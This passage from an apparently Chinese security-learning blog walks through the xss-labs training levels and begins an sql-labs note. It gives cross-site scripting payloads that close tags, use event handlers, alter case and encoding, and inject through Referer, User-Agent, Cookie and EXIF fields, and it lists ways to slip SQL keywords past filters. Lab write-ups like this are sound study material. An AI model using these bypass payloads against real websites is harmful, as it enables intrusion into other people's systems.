UTF-8 替代。</span><br><span class="line"></span><br><span class="line">double_encode可选。布尔值，规定了是否编码已存在的 HTML 实体。</span><br><span class="line">TRUE - 默认。将对每个实体进行转换。</span><br><span class="line">FALSE - 不会对已存在的 HTML 实体进行编码。</span><br></pre></td></tr></table></figure><p>如需把特殊的 HTML 实体转换回字符，请使用 <code>htmlspecialchars_decode() </code>函数。</p><p><strong>htmlentities()</strong></p><p>用法同<code>htmlspecialchars()</code>一样。要把 HTML 实体转换回字符，请使用 <a href="https://www.w3school.com.cn/php/func_string_html_entity_decode.asp">html_entity_decode()</a> 函数。</p><p><strong>提示：</strong>请使用 <a href="https://www.w3school.com.cn/php/func_string_get_html_translation_table.asp">get_html_translation_table()</a> 函数来返回 htmlentities() 使用的翻译表。</p><h6 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h6><p>1.寻找其他注入点</p><p>2.html编码-&gt;实体化-&gt;html代码</p><h2 id="2-靶场记录"><a href="#2-靶场记录" class="headerlink" title="2.靶场记录"></a>2.靶场记录</h2><h3 id="Level-1：未做任何处理"><a href="#Level-1：未做任何处理" class="headerlink" title="Level 1：未做任何处理"></a>Level 1：未做任何处理</h3><p>观察发现，url中的内容会在网页中回显，那么这里可以当作注入点</p><p><img src="image-20210223171545541.png" alt="image-20210223171545541"></p><p>输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，成功，会自动跳转到下一关</p><p><img src="image-20210223171742924.png" alt="image-20210223171742924"></p><p>分享网页源代码，其中定义了alert的js函数，自然触发到下一关了。</p><p><img src="image-20210223171819594.png" alt="image-20210223171819594"></p><h3 id="Level-2：简单闭合input标签"><a href="#Level-2：简单闭合input标签" class="headerlink" title="Level 2：简单闭合input标签"></a>Level 2：简单闭合input标签</h3><p>看到url中的信息以及结合网页代码，可以得出输入框中的内容就是keyword的内容，那就好办了，先输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>试一下</p><p><img src="image-20210223180551257.png" alt="image-20210223180551257"></p><p>之后查看网页源代码</p><p><img src="image-20210223180835843.png" alt="image-20210223180835843"></p><p>看到<code>&lt;</code>与<code>&gt;</code>被实体化了，那就猜测后台对输入文本进行了实体化。但是在<code>input</code>标签那里没有做处理，我们就从这里入手。</p><p>根据前端input标签构造闭合标签，并注释掉后边的，<code>&quot;&gt; &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; //</code> 通过！</p><p><img src="image-20210223205538852.png" alt="image-20210223205538852"></p><h3 id="Level-3：实体化"><a href="#Level-3：实体化" class="headerlink" title="Level 3：实体化&lt;、”、&gt;"></a>Level 3：实体化&lt;、”、&gt;</h3><p>看到输入框走一波，检察网页源代码发现被实体化了</p><p><img src="image-20210224001524780.png" alt="image-20210224001524780"></p><p>这时候不急，输入<code>&#39; &quot; &lt; &gt; /</code>,测试一下哪些被处理了，哪些没被处理。</p><p><img src="image-20210224001819374.png" alt="image-20210224001819374"></p><p>单引号没被实体化，于是有以下方法</p><p><strong>1.onclick点击事件</strong></p><p>可以使用点击事件，onclick事件会在元素被点击时发生</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTML中：</span><br><span class="line">&lt;element onclick=&quot;js_code&quot;&gt;</span><br><span class="line">JS中：</span><br><span class="line">object.onclick=function()&#123;JS_code&#125;;</span><br></pre></td></tr></table></figure><p>根据前端input标签构造闭合payload如下</p><p><code>&#39;onclick=alert(&quot;xss&quot;) #</code> ,,确定之后点击一下输入框即可成功！</p><p><img src="image-20210224002623824.png" alt="image-20210224002623824"></p><p><strong>2.onfocus焦点事件</strong></p><p>onfocus 事件在对象获得焦点时发生。</p><p>onfocus 通常用于 <input>, <select>, 和<a>.</a></select></p><p>使用鼠标点击该输入框时输入框被选中，该输入框获得焦点,此时输入框就会触发onfocus事件.</p><p>payload：<code>&#39;onfocus=javascript:alert(&#39;xss&#39;) &gt; </code></p><p><img src="image-20210224134443648.png" alt="image-20210224134443648"></p><p><strong>3.JavaScript伪协议</strong></p><p>上一个方法是结合了JavaScript伪协，这里介绍一下</p><p><code>javascript</code>:这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。<br>将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中。这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。如果javascript:URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。</p><p>javascript URL还可以含有只执行动作，但不返回值的javascript语句。<br><code>javascript:alert(&quot;xss&quot;)</code>装载了这种URL时，浏览器仅执行其中的javascript代码，但由于没有作为新文档来显示的值，因此它并不改变当前显示的文档。</p><p>payload：<code>&#39;onclick=&#39;javascript:alert(/xss/)</code>,输入进行搜索，之后在输入框点击一下即可触发弹窗。</p><p><img src="image-20210224134643382.png" alt="image-20210224134643382"></p><h3 id="Level-4：双引号闭合"><a href="#Level-4：双引号闭合" class="headerlink" title="Level 4：双引号闭合"></a>Level 4：双引号闭合</h3><p>查看HTML源码，和上一关一样，只不过input标签的value是双引号闭合，这时候我们输入<code>&#39; &quot; &lt; &gt; /</code>,测试一下</p><p><img src="image-20210224145313026.png" alt="image-20210224145313026"></p><p>可以发现input标签处只是对<code>&lt;</code>和<code>&gt;</code>进行了实体化，这样就可以构造我们的闭合标签进行注入了。可以用js伪协议或者是点击事件进行触发</p><p>payload：<code>&quot;onclick=&#39;javascript:alert(/xss/)</code></p><p>或者：<code>&quot;onclick=alert(&quot;xss&quot;) #</code></p><p><img src="image-20210224145800437.png" alt="image-20210224145800437"></p><h3 id="Level-5：-构造超链接标签"><a href="#Level-5：-构造超链接标签" class="headerlink" title="Level 5： 构造超链接标签"></a>Level 5： 构造超链接标签</h3><p>输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>查看源码</p><p><img src="image-20210224150927132.png" alt="image-20210224150927132"></p><p>在<code>h2</code>标签处实体化了<code>&lt;</code>和<code>&gt;</code>，在<code>&lt;input&gt;</code>标签则没有使用HTML实体编码而是将<code>script</code>转为<code>scr_ipt </code></p><p>另外进行点击事件和焦点事件的测试，发现也将<code>onclick</code>和<code>onfocous</code>转化成了<code>o_nclick</code>和<code>o_nfocous</code></p><p>另外检查<code>&#39;  &quot; &lt; &gt; /</code>发现input标签处没有进行实体化</p><p><img src="image-20210224152219318.png" alt="image-20210224152219318"></p><p>这里解决方法是构造超链接标签</p><p>payload：<code>&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;alert&lt;/a&gt; &lt;&quot;</code></p><p><img src="image-20210224151944189.png" alt="image-20210224151944189"></p><p>不过需要点击<code>alert</code>按钮才能触发</p><h3 id="Level-6：大小写绕过"><a href="#Level-6：大小写绕过" class="headerlink" title="Level 6：大小写绕过"></a>Level 6：大小写绕过</h3><p>第一步检查<code>&#39; &quot; &lt; &gt; /</code>实体化结果，input标签处没有进行实体化，且闭合是双引号</p><p><img src="image-20210224152345836.png" alt="image-20210224152345836"></p><p>接下来检查对标签也没有进行处理，结果如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;#&lt;scr_ipt&gt;</span><br><span class="line">&lt;onclick&gt;#&lt;o_nclick&gt;</span><br><span class="line">&lt;onfocus&gt;#&lt;o_nfocus&gt;</span><br><span class="line">&lt;a href=&gt;#&lt;a hr_ef=&gt;</span><br><span class="line">JavaScript#JavaScr_ipt</span><br></pre></td></tr></table></figure><p>对标签进行简单的大小写竟然成功了！原因是<strong>html不区分大小写，xml对大小写敏感</strong></p><p>payload：<code>&quot;&gt;&lt;Script&gt;alert(&quot;xss&quot;)&lt;/scriPt&gt;</code></p><p><img src="image-20210224153552032.png" alt="image-20210224153552032"></p><h3 id="Level-7：-复写绕过"><a href="#Level-7：-复写绕过" class="headerlink" title="Level 7： 复写绕过"></a>Level 7： 复写绕过</h3><p>第一步检查<code>&#39; &quot; &lt; &gt; /</code>实体化结果，input标签处没有进行实体化，且闭合是双引号</p><p><img src="image-20210224152345836.png" alt="image-20210224152345836"></p><p>接下来检查对标签也没有进行处理，结果如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;#&lt;&gt;</span><br><span class="line">&lt;onclick&gt;#&lt;click&gt;</span><br><span class="line">&lt;onfocus&gt;#&lt;focus&gt;</span><br><span class="line">&lt;a href=&gt;#&lt;a =&gt;</span><br><span class="line">JavaScript#</span><br></pre></td></tr></table></figure><p>对标签进行简单的大小写测试发现结果和上面一样。</p><p>进行复写，发现绕过！</p><p>payload：<code>&quot;&gt;&lt;Scriscriptpt&gt;alert(&quot;xss&quot;)&lt;/scscriptriPt&gt;</code></p><p><img src="image-20210224154053683.png" alt="image-20210224154053683"></p><h3 id="Level-8：html编码-实体化-html代码"><a href="#Level-8：html编码-实体化-html代码" class="headerlink" title="Level 8：html编码-&gt;实体化-&gt;html代码"></a>Level 8：html编码-&gt;实体化-&gt;html代码</h3><p>这一关打开看到是添加友情链接，输入test测试发现是把输入内容添加到一个超链接标签里面，这就是注入点</p><p><img src="image-20210224154525758.png" alt="image-20210224154525758"></p><p>1.检查<code>&#39; &quot; &lt; &gt; /</code>实体化结果，发现只是对双引号进行了实体化</p><p>2.检查对标签处理情况，结果和level6一样</p><p>3.检查大小写情况，结果是在标签中加入了<code>_</code></p><p>4.由于没有删除关键字，所以不用进行复写实验了。</p><p>5.进行实体编码实验</p><p>payload：<code>javascript:alert(/xss/)</code></p><p>转换后的Unicode：<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#47;&amp;#41;</code></p><p><img src="image-20210224160357188.png" alt="image-20210224160357188"></p><p>添加后点击友情链接即可。</p><p>为什么用Javascript伪协议？</p><p>因为这里涉及到url跳转，即url解析。</p><h3 id="Level-9：url匹配"><a href="#Level-9：url匹配" class="headerlink" title="Level 9：url匹配"></a>Level 9：url匹配</h3><p>按照level 8来实验，发现无论什么结果都是</p><p><img src="image-20210224161453976.png" alt="image-20210224161453976"></p><p>那么猜测这里对url地址做了匹配，只有包含正常的url地址才能添加到href属性值中</p><p>实验<code>http://javascript:alert(/xss/)</code>，发现对关键字插入了<code>_</code></p><p><img src="image-20210224161721361.png" alt="image-20210224161721361"></p><p>尝试对关键字进行大小写，发现结果一样</p><p>最后按照level 8一样进行编码</p><p>payload：&#96;</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#<span class="number">106</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">118</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">105</span>;&amp;#<span class="number">112</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">58</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">108</span>;&amp;#<span class="number">101</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">116</span>;&amp;#<span class="number">40</span>;&amp;#<span class="number">47</span>;&amp;#<span class="number">120</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">47</span>;&amp;#<span class="number">41</span>;<span class="comment">// http://</span></span><br><span class="line">#第一个<span class="comment">//是注释掉后面的http://,如果不加，则跳转不会执行弹窗</span></span><br></pre></td></tr></table></figure><p><img src="image-20210224162035352.png" alt="image-20210224162035352"></p><h3 id="Level-10：隐藏域"><a href="#Level-10：隐藏域" class="headerlink" title="Level 10：隐藏域"></a>Level 10：隐藏域</h3><p>检查<code>&#39; &quot; &lt; &gt; /</code>实体化结果，发现只单引号和&#x2F;没有进行实体化</p><p>但是进行查看前端源码的时候发现有一点不一样，几个input标签都设置了hidden，这就是隐藏域</p><p><img src="image-20210224171825580.png" alt="image-20210224171825580"></p><p>此题有两种解法</p><h4 id="1-修改隐藏域属性"><a href="#1-修改隐藏域属性" class="headerlink" title="1.修改隐藏域属性"></a>1.修改隐藏域属性</h4><p><strong>隐藏域</strong></p><p>来源于：<a href="https://www.cnblogs.com/syomm/articles/5825976.html">https://www.cnblogs.com/syomm/articles/5825976.html</a></p><p>用法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>解释：</p><blockquote><table bgcolor="red">1.隐藏域在页面中对于用户是不可见的，在表单中插入隐藏域的目的在于收集或发送信息，以利于被处理表单的程序所使用。浏览者单击发送按钮发送表单的时候，隐藏域的信息也被一起发送到服务器。 <br>2.有些时候我们要给用户一信息，让他在提交表单时提交上来以确定用户身份，如sessionkey，等等．当然这些东西也能用cookie实现，但使用隐藏域就简单的多了．而且不会有浏览器不支持，用户禁用cookie的烦恼。 <br>3.有些时候一个form里有多个提交按钮，怎样使程序能够分清楚到底用户是按那一个按钮提交上来的呢？我们就可以写一个隐藏域，然后在每一个按钮 处加上onclick="document.form.command.value="xx""然后我们接到数据后先检查command的值就会知道用户 是按的那个按钮提交上来的。 <br>4.有时候一个网页中有多个form，我们知道多个form是不能同时提交的，但有时这些form确实相互作用，我们就可以在form中添加隐藏域来使它们联系起来。 <br>5.javascript不支持全局变量，但有时我们必须用全局变量，我们就可以把值先存在隐藏域里，它的值就不会丢失了。 <br>6.还有个例子，比如按一个按钮弹出四个小窗口，当点击其中的一个小窗口时其他三个自动关闭．可是IE不支持小窗口相互调用，所以只有在父窗口写个隐藏域，当小窗口看到那个隐藏域的值是close时就自己关掉</table></blockquote><p>解题方法</p><p>修改前台input属性，任何一个都可</p><p><img src="image-20210224175248624.png" alt="image-20210224175248624"></p><p>会出现一个空白输入框，点击输入框，即会出现弹窗</p><p><img src="image-20210224175343689.png" alt="image-20210224175343689"></p><h4 id="2-突破用隐藏域属性"><a href="#2-突破用隐藏域属性" class="headerlink" title="2.突破用隐藏域属性"></a>2.突破用隐藏域属性</h4><p>利用3个隐藏属性，把这三个参数传进去看谁能够突破</p><p>payload：<code>test&amp;t_link=1&amp;t_history=2&amp;t_sort=3</code></p><p><img src="image-20210224180133865.png" alt="image-20210224180133865"></p><p>发现第三个可以突破。</p><p>构造payload：<code>test&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></p><p>设置type&#x3D;text的目的是因为我们用到是点击事件来触发弹窗，所以要把这个输入框显示出来才能点击触发</p><p><img src="image-20210224180843588.png" alt="image-20210224180843588"></p><h3 id="Level-11：referer注入"><a href="#Level-11：referer注入" class="headerlink" title="Level 11：referer注入"></a>Level 11：referer注入</h3><p>检查<code>&#39; &quot; &lt; &gt; /</code>实体化结果，发现只单引号和&#x2F;没有进行实体化,在查看前端源码时发现也和前一关差不多有一个隐藏域，但是多了一个<code>t_ref</code>，又结合没有做测试时发现其值是上一关的payload</p><p><img src="image-20210224193915733.png" alt="image-20210224193915733"></p><p>看到一个新标签，并且命名和referer很像，那么判断这是个referer。</p><p>若是没有注意到这个怎么办？按照上一关的方法来，先看看有哪些可以突破</p><p>payload：<code>test&amp;t_link=1&amp;t_history=2&amp;t_sort=3&amp;t_ref=4</code></p><p><img src="image-20210224194818618.png" alt="image-20210224194818618"></p><p>发现第三个可以突破。</p><p>构造payload：<code>test&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)&quot;</code></p><p>但是双引号被转义了。。。</p><p><img src="image-20210224194954108.png" alt="image-20210224194954108"></p><p>既然浏览器找不到利用点了那就抓包分析一下HTTP数据</p><p><img src="image-20210224231240010.png" alt="image-20210224231240010"></p><p>可以发现没有referer，那么我们加上一个试试?</p><p><img src="image-20210224231431620.png" alt="image-20210224231431620"></p><p>可以发现referer中的信息就是第四个标签的内容了，那么此时我们就可以构造payload了</p><p>payload：<code>referer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)&quot;</code></p><p><img src="image-20210224232234059.png" alt="image-20210224232234059"></p><p>接下来把修改后的包放到浏览器去就ok了</p><p><img src="image-20210224232527092.png" alt="image-20210224232527092"></p><p>还有另外一种方法就是和10关一样在前端修改input标签</p><h3 id="Level-12：user-agent注入"><a href="#Level-12：user-agent注入" class="headerlink" title="Level 12：user-agent注入"></a>Level 12：user-agent注入</h3><p>这一关学聪明了(主要是懒；。。)直接查看前端源码</p><p><img src="image-20210224233753609.png" alt="image-20210224233753609"></p><p>发现第四个标签的内容是user-agent</p><p>直接抓包修改UA为<code>&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)&quot;</code></p><p>点击触发即可</p><p><img src="image-20210224234040073.png" alt="image-20210224234040073"></p><p>另外一种也是修改前端页面的方法，同11</p><h3 id="Level-13：cookie注入"><a href="#Level-13：cookie注入" class="headerlink" title="Level 13：cookie注入"></a>Level 13：cookie注入</h3><p>直接走一波网页源码</p><p><img src="image-20210224234304774.png" alt="image-20210224234304774"></p><p>发现新的标签<code>t_cook</code>，猜测和cookie相关，抓包初始流量走一波</p><p><img src="image-20210224234540000.png" alt="image-20210224234540000"></p><p>修改cookie：<code>&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)&quot;</code></p><p><img src="image-20210224234741006.png" alt="image-20210224234741006"></p><p>over！</p><p><img src="image-20210224234859004.png" alt="image-20210224234859004"></p><h3 id="Level-14：图片exif"><a href="#Level-14：图片exif" class="headerlink" title="Level 14：图片exif"></a>Level 14：图片exif</h3><p>本节参考：<a href="https://blog.csdn.net/qq_32393893/article/details/104814749">https://blog.csdn.net/qq_32393893/article/details/104814749</a></p><h4 id="1-什么是exif"><a href="#1-什么是exif" class="headerlink" title="1.什么是exif"></a>1.什么是exif</h4><p>exif，可交换图像文件格式。是专门为<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E7%A0%81%E7%9B%B8%E6%9C%BA">数码相机</a>的照片设定的，可以记录数码照片的属性信息和拍摄数据。可使用鼠标右键进入属性页面查看部分信息。</p><h4 id="2-exif-xss漏洞原理"><a href="#2-exif-xss漏洞原理" class="headerlink" title="2.exif xss漏洞原理"></a>2.exif xss漏洞原理</h4><p>有些网站有读取图片exif信息的功能，当网站读取到的恶意的exif信息就会触发这个payload。</p><p>有些谷歌浏览器安装了EXIF Vewer插件，而chrome Exif Viewer插件获取图片exif信息的时候没有过滤，导致了XSS代码的执行。</p><h4 id="3-怎么修改exif信息"><a href="#3-怎么修改exif信息" class="headerlink" title="3.怎么修改exif信息"></a>3.怎么修改exif信息</h4><p><strong>linux系统系统</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install exiftool#安装exiftool工具</span><br><span class="line">exiftoll  -artist=&#x27;&quot;&lt;img src=1 onerrror=alert(/shy/)&gt;&#x27;  exif.jpg#在图片作者栏中写入payload</span><br><span class="line">上传到可以读取图片exif信息的网站，出现弹窗，复现成功。</span><br></pre></td></tr></table></figure><p><strong>windows操作系统</strong></p><p>鼠标右键进入属性页面-双击直接填写payload-上传弹窗</p><h3 id="Level-15：ng-include包含xss"><a href="#Level-15：ng-include包含xss" class="headerlink" title="Level 15：ng-include包含xss"></a>Level 15：ng-include包含xss</h3><p>查看源码</p><p><img src="image-20210225000841505.png" alt="image-20210225000841505"></p><p>注意到<code>angular.min.js</code>，我不了解Angular，所以我查了<code>class=&quot;ng-include&quot;</code><a href="https://www.runoob.com/angularjs/ng-ng-include.html">AngularJS <code>ng-include</code> 指令 </a>用于包含外部的HTML文件，包含的内容作为元素的子节点，属性值可以是一个表达式返回一个文件名；意思就是我们可以利用src包含一个存在xss的页面（包含level13&#x2F;12&#x2F;11没反应）</p><p>ng-include 指令用于包含外部的 HTML 文件。</p><p>包含的内容将作为指定元素的子节点。</p><p>ng-include 属性的值可以是一个表达式，返回一个文件名。</p><p>默认情况下，包含的文件需要包含在同一个域名下。 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src= &#x27;level10.php?t_sort=&quot; onclick=alert(/xss/) type=&quot;text&quot; &gt;&lt; &#x27;</span><br></pre></td></tr></table></figure><h4 id="1-修改网页前端"><a href="#1-修改网页前端" class="headerlink" title="1.修改网页前端"></a>1.修改网页前端</h4><p>修改前端img标签代码</p><p><img src="image-20210225001922009.png" alt="image-20210225001922009"></p><h4 id="2-传递参数"><a href="#2-传递参数" class="headerlink" title="2.传递参数"></a>2.传递参数</h4><p>也是查看源码之后才发现ng-include传递参数是用src</p><p><img src="image-20210225002720823.png" alt="image-20210225002720823"></p><p>直接在网页url处构造payload：<code>?src= &#39;level10.php?t_sort=&quot; onclick=alert(/xss/) type=&quot;text&quot; &gt;&lt; &#39;</code></p><p><img src="image-20210225002954853.png" alt="image-20210225002954853"></p><h3 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h3><p>看一下源码发现没有什么可以利用的点，只是传递的参数被传入了<center>里面</center></p><p>在url里面输入<code>&lt;script&gt; &#39; &quot; /</code>试一试</p><p><img src="image-20210225004111171.png" alt="image-20210225004111171"></p><p>发现关键字、空格、&#x2F;被替换成了空格字符实体编码<code>&amp;nbsp</code></p><p>绕过思路：可以用回车来将它们分开。</p><p>而且这里<code>/</code>符号也被编码了，所以我们需要的是一个不需要闭合的标签，比如之前所用过的<code>&lt;a href&gt;</code></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a%0Ahref=&#x27;javas%0Acript:alert(&quot;xss&quot;)&#x27;&gt;</span><br><span class="line">%0a代表回车的html编码</span><br></pre></td></tr></table></figure><p>成功弹窗</p><p><img src="image-20210225004626450.png" alt="image-20210225004626450"></p><h3 id="Level-17"><a href="#Level-17" class="headerlink" title="Level 17"></a>Level 17</h3><p>直接看源码</p><p><img src="image-20210225004912467.png" alt="image-20210225004912467"></p><p>提交的两个参数的值出现在了<code>&lt;embed&gt;</code>标签的<strong>src</strong>属性值中，猜测该标签应该就是突破口。</p><p>测试一下<code>&#39; &quot; &lt;script&gt; / </code></p><p><img src="image-20210225005210375.png" alt="image-20210225005210375"></p><p><strong>方法一</strong></p><p>构造payload：<code>?arg01= onmousemove&amp;arg02=javascript:alert(/xss/)</code></p><p><img src="image-20210225005452865.png" alt="image-20210225005452865"></p><p><strong>方法二</strong></p><p><code>&lt;embed&gt;</code>标签就是引入一个<code>swf文件</code>到浏览器端，并且它的<strong>src</strong>属性值没有添加<strong>引号</strong>，所以不用闭合</p><p><img src="image-20210225010003690.png" alt="image-20210225010003690"></p><p>但是我本地浏览器不支持此插件，使用没能复现成功</p><h3 id="Level-18"><a href="#Level-18" class="headerlink" title="Level 18"></a>Level 18</h3><p>和上一关一样。。。</p><h3 id="Level-19：flash-xss"><a href="#Level-19：flash-xss" class="headerlink" title="Level 19：flash xss"></a>Level 19：flash xss</h3><p>这里看前端源码发现<strong>src</strong>的值使用<strong>双引号</strong>括起来的，而且丝毫不要怀疑进行了实体化</p><p><img src="image-20210225010749334.png" alt="image-20210225010749334"></p><p>这一关涉及一种xss攻击手段叫做<strong>flash xss</strong></p><p>Flash产生的xss问题主要有两种方式：</p><ul><li>加载第三方资源</li><li>与javascript通信引发XSS。</li></ul><p> 常见的可触发xss的危险函数有：<code>getURL</code> <code>navigateToURL</code> <code>ExternalInterface.call</code> <code>htmlText</code> <code>loadMovie</code>等</p><p>要想知道这一关的是不是属于<strong>flash xss</strong>，只需要对引用的<strong>swf</strong>文件进行反编译然后进行源码分析。</p><p>这里我说使用的对此类文件进行反编译的工具是<code>jpexs-decompiler</code>。</p><p>项目地址:<a href="https://github.com/jindrapetrik/jpexs-decompiler">https://github.com/jindrapetrik/jpexs-decompiler</a></p><p>其实flash在不久将会被弃用，所以搞懂这关用处不大，看一下这两篇文章</p><p><a href="https://blog.csdn.net/u014029795/article/details/103213877?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159547621119725219908275%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=159547621119725219908275&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v3~pc_rank_v4-2-103213877.first_rank_ecpm_v3_pc_rank_v4&utm_term=xss-labs%2019&spm=1018.2118.3001.4187">https://blog.csdn.net/u014029795/article/details/103213877?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159547621119725219908275%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=159547621119725219908275&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v3~pc_rank_v4-2-103213877.first_rank_ecpm_v3_pc_rank_v4&amp;utm_term=xss-labs%2019&amp;spm=1018.2118.3001.4187</a></p><p><a href="https://www.freebuf.com/sectool/108568.html">https://www.freebuf.com/sectool/108568.html</a></p><h3 id="Level-20：flash-xss"><a href="#Level-20：flash-xss" class="headerlink" title="Level 20：flash xss"></a>Level 20：flash xss</h3><p><a href="https://blog.csdn.net/u014029795/article/details/103217680?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159547621119725219908275%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=159547621119725219908275&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v3~pc_rank_v4-1-103217680.first_rank_ecpm_v3_pc_rank_v4&utm_term=xss-labs%2019&spm=1018.2118.3001.4187">https://blog.csdn.net/u014029795/article/details/103217680?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159547621119725219908275%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=159547621119725219908275&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v3~pc_rank_v4-1-103217680.first_rank_ecpm_v3_pc_rank_v4&amp;utm_term=xss-labs%2019&amp;spm=1018.2118.3001.4187</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs记录2</title>
      <link href="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/"/>
      <url>/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/</url>
      
        <content type="html"><![CDATA[<p>本文记录sqL-Labs的23-53关，这个系列开始不会一步步按照sql注入的步骤来了，会直接给出结果和思路。</p><span id="more"></span><h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h2><h3 id="1-绕过sql过滤与转义"><a href="#1-绕过sql过滤与转义" class="headerlink" title="1.绕过sql过滤与转义"></a>1.绕过sql过滤与转义</h3><p>为了防止sql注入攻击，往往在与数据库进行交互之前会进行参数转义过滤等操作。</p><h4 id="1-绕过关键字过滤"><a href="#1-绕过关键字过滤" class="headerlink" title="1.绕过关键字过滤"></a>1.绕过关键字过滤</h4><p>1.注释符绕过：sel&#x2F;**&#x2F;ect</p><p>2.大小写绕过：SelEct</p><p>3.双写绕过：selselectect</p><p>4.符号绕过：and&lt;&#x3D;&gt;&amp;&amp;，or&lt;&#x3D;&gt;||，xor&lt;&#x3D;&gt;|，not&lt;&#x3D;&gt;!</p><p>5.尖括号绕过：sele&lt;&gt;ct</p><p>6.编码绕过：url编码绕过、16进制编码绕过、ASCII编码绕过、HEX、unicode编码绕过</p><p>7.等价函数绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line">@@user ==&gt; user()</span><br><span class="line">@@datadir ==&gt; datadir()</span><br><span class="line">还有参考下面的绕过逗号过滤，这些都是相通的</span><br></pre></td></tr></table></figure><p>8.生僻函数代替，例如报错注入中的polygon</p><h4 id="2-绕过特殊字符过滤"><a href="#2-绕过特殊字符过滤" class="headerlink" title="2.绕过特殊字符过滤"></a>2.绕过特殊字符过滤</h4><p>1.绕过注释符过滤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用or‘1代替注释符</span><br></pre></td></tr></table></figure><p>1.绕过空格过滤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">双空格、/**/代替空格、()代替空格、回车代替空格、tab代替空格、`代替空格</span><br><span class="line">编码代替空格:</span><br><span class="line">%09 TAB（水平），%0a 新建一行，%0c 新的一页，%0d return功能，%0b TAB键(垂直),%a0 